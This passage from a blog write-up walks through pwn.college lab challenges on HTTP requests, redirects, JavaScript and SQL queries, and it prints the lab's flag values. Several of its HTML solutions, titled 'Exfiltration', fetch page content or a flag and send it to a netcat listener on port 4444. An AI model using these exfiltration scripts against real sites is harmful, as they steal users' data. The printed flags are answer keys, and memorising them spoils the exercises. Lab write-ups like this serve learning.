<h4 id="27-HTTP-Cookies-netcat"><a href="#27-HTTP-Cookies-netcat" class="headerlink" title="27. HTTP Cookies (netcat)"></a>27. HTTP Cookies (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@talking-web~http-cookies-netcat:~/Desktop$ nc -v 127.0.01 80</span><br><span class="line">Connection to 127.0.01 80 port [tcp/http] succeeded!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Cookie: cookie=38c5a3fa82c7a07c9acd13244c494a59 </span><br></pre></td></tr></table></figure>

<h4 id="28-HTTP-Cookies-python"><a href="#28-HTTP-Cookies-python" class="headerlink" title="28. HTTP Cookies (python)"></a>28. HTTP Cookies (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:80&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="29-Server-State-python"><a href="#29-Server-State-python" class="headerlink" title="29. Server State (python)"></a>29. Server State (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:80&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250303120441856.png" class="" title="image-20250303120441856">

<p>得益于，requests模块的get请求会自动跟踪重定向，因此执行一次脚本发现302重定向，会自动跟踪。则自动发送了4个请求，达到题目要求，获得flag。</p>
<h4 id="30-Listening-Web"><a href="#30-Listening-Web" class="headerlink" title="30. Listening Web"></a>30. Listening Web</h4><p>把第一关的Server代码copy到这儿，然后修改端口并运行即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<h4 id="31-Speaking-Redirects"><a href="#31-Speaking-Redirects" class="headerlink" title="31. Speaking Redirects"></a>31. Speaking Redirects</h4><p>写Server端的重定向即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirector</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">f&quot;http://challenge.localhost:80/submission&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">app.run(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<h4 id="32-JavaScript-Redirects"><a href="#32-JavaScript-Redirects" class="headerlink" title="32. JavaScript Redirects"></a>32. JavaScript Redirects</h4><p>写一个JavaScript代码，放在<code>/home/hacker/public_html/solve.html</code>中即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirecting...<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://challenge.localhost:80/request&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="33-Including-JavaScript"><a href="#33-Including-JavaScript" class="headerlink" title="33. Including JavaScript"></a>33. Including JavaScript</h4><p>这道题的思路是，首先客户端请求<code>solve.html</code>，我们在其中写入javascript脚本，让其访问服务器指定paths的javascript脚本并执行，随后将该执行结果重定向到某个能看到的地方即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://challenge.localhost/mission&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;http://challenge.localhost:80/?flag=&quot;</span> + flag;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>javascript中的src属性：</p>
<p>当JavaScript的<code>&lt;scirpt&gt;</code>标签的src属性指定一个URL时，浏览器会发送一个HTTP GET请求到指定的URL，请求相应资源。获取资源（一般是javascript文件）后会下载JavaScript文件，解析并执行其中的JavaScript代码。</p>
</blockquote>
<h4 id="34-HTTP-javascript"><a href="#34-HTTP-javascript" class="headerlink" title="34. HTTP (javascript)"></a>34. HTTP (javascript)</h4><p>这道题真坑哇，这和那个CORS没关系。也不需要启动浏览器调试，也调试不了。得开practice模式调试。思路就是，直接使用fetch目标，然后对拿到的data做处理，让它发送给一个其他服务器就好了。我用的是nc -l 4444，监听4444端口。然后那边用POST提交数据就OK了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://challenge.localhost:80/task&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(!response.<span class="property">ok</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">website_content</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&quot;http://localhost:4444/&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: website_content,</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="35-HTTP-Get-Parameters-javascript"><a href="#35-HTTP-Get-Parameters-javascript" class="headerlink" title="35. HTTP Get Parameters (javascript)"></a>35. HTTP Get Parameters (javascript)</h4><p>加参数而已，只需要在fetch里直接加。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://challenge.localhost:80/complete?challenge_key=vjcopwsk&amp;secure_key=zqzbftms&amp;auth=yzcibfla&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(!response.<span class="property">ok</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">website_content</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&quot;http://localhost:4444/&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: website_content,</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="36-HTTP-Forms-javascript"><a href="#36-HTTP-Forms-javascript" class="headerlink" title="36. HTTP Forms (javascript)"></a>36. HTTP Forms (javascript)</h4><p>查一下，fetch如何发送POST请求时加参数就好了。思路清晰后，就是语法的问题，AI的出现让这些问题都不是问题。所以重要的是思路。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span></span><br><span class="line"><span class="language-javascript">        params.<span class="title function_">append</span>(<span class="string">&#x27;auth_pass&#x27;</span>,<span class="string">&#x27;hvapqzli&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        params.<span class="title function_">append</span>(<span class="string">&#x27;solution&#x27;</span>, <span class="string">&#x27;kmdajdmm&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        params.<span class="title function_">append</span>(<span class="string">&#x27;security_token&#x27;</span>, <span class="string">&#x27;zprqxfbr&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://challenge.localhost:80/submission&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: params,</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(!response.<span class="property">ok</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">website_content</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&quot;http://localhost:4444/&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: website_content,</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="SQL-Playground"><a href="#SQL-Playground" class="headerlink" title="SQL Playground"></a>SQL Playground</h3><h4 id="1-SQL-Queries"><a href="#1-SQL-Queries" class="headerlink" title="1. SQL Queries"></a>1. SQL Queries</h4><p>简单的SQL语法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> name from sqlite_master <span class="built_in">where</span> <span class="built_in">type</span> = <span class="string">&#x27;table&#x27;</span></span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;information&#x27;</span>&#125;</span><br><span class="line">hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> * from information</span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;record&#x27;</span>: <span class="string">&#x27;pwn.college&#123;sL39JzNFAYS1b4urGcF1vDs5hcn.QX5kzN0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-Filtering-SQL"><a href="#2-Filtering-SQL" class="headerlink" title="2. Filtering SQL"></a>2. Filtering SQL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~filtering-sql:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> info from repository <span class="built_in">where</span> info like <span class="string">&#x27;%pwn%&#x27;</span></span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;info&#x27;</span>: <span class="string">&#x27;pwn.college&#123;UIysK2dWKY3qPB4nHgeDwWXQnHb.QXwADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-Choosing-Columns"><a href="#3-Choosing-Columns" class="headerlink" title="3. Choosing Columns"></a>3. Choosing Columns</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; SELECT sql FROM sqlite_master WHERE <span class="built_in">type</span> = <span class="string">&#x27;table&#x27;</span> AND name = <span class="string">&#x27;resources&#x27;</span>;</span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;sql&#x27;</span>: <span class="string">&#x27;CREATE TABLE resources(flag_tag,datum)&#x27;</span>&#125;</span><br><span class="line">hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> datum from resources <span class="built_in">where</span> datum like <span class="string">&quot;%pwn%&quot;</span>;</span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;datum&#x27;</span>: <span class="string">&#x27;pwn.college&#123;k6URsZ8-uBwi_TNBBVNFI7zEreQ.QXxADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-Exclusionary-Filtering"><a href="#4-Exclusionary-Filtering" class="headerlink" title="4. Exclusionary Filtering"></a>4. Exclusionary Filtering</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~exclusionary-filtering:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> secret from data <span class="built_in">where</span> secret like <span class="string">&#x27;%pwn.college%&#x27;</span></span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;secret&#x27;</span>: <span class="string">&#x27;pwn.college&#123;AcDNrhXELmHNhramheE64AkS0AB.QXyADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-Filtering-Strings"><a href="#5-Filtering-Strings" class="headerlink" title="5. Filtering Strings"></a>5. Filtering Strings</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~filtering-strings:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> record from secrets <span class="built_in">where</span> record like <span class="string">&#x27;%pwn.college%&#x27;</span></span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;record&#x27;</span>: <span class="string">&#x27;pwn.college&#123;ctyoxv05RHMSQR6B2ybT7siWQZs.QXzADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6-Filtering-on-Expressions"><a href="#6-Filtering-on-Expressions" class="headerlink" title="6. Filtering on Expressions"></a>6. Filtering on Expressions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hacker@sql-playground~filtering-on-expressions:~/Desktop$ /challenge/sql </span><br><span class="line">sql&gt; <span class="keyword">select</span> detail from items <span class="built_in">where</span> detail like <span class="string">&#x27;%pwn.college%&#x27;</span></span><br><span class="line">Got 1 rows.</span><br><span class="line">- &#123;<span class="string">&#x27;detail&#x27;</span>: <span class="string">&#x27;pwn.college&#123;QwM7-oEhh9lTAvkfmOVVXEUbCj3.QX0ADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7-SELECTING-Expressions"><a href="#7-SELECTING-Expressions" class="headerlink" title="7. SELECTING Expressions"></a>7. SELECTING Expressions</h4><p>用substr限制5个字符的输出，然后一点点拼接出flag。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(payload, <span class="number">56</span>, <span class="number">5</span>) <span class="keyword">from</span> payloads <span class="keyword">where</span> payload <span class="keyword">like</span> <span class="string">&#x27;%pwn.college%&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="8-Composite-Conditions"><a href="#8-Composite-Conditions" class="headerlink" title="8. Composite Conditions"></a>8. Composite Conditions</h4><p>记得使用cat查看<code>/challenge/sql</code>的源码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span> <span class="keyword">select</span> payload <span class="keyword">from</span> entries <span class="keyword">where</span> payload <span class="keyword">like</span> <span class="string">&#x27;pwn.college&#123;%&#x27;</span> <span class="keyword">and</span> payload <span class="keyword">like</span> <span class="string">&#x27;%&#125;&#x27;</span> <span class="keyword">and</span> flag_tag <span class="operator">=</span> <span class="number">1337</span></span><br></pre></td></tr></table></figure>

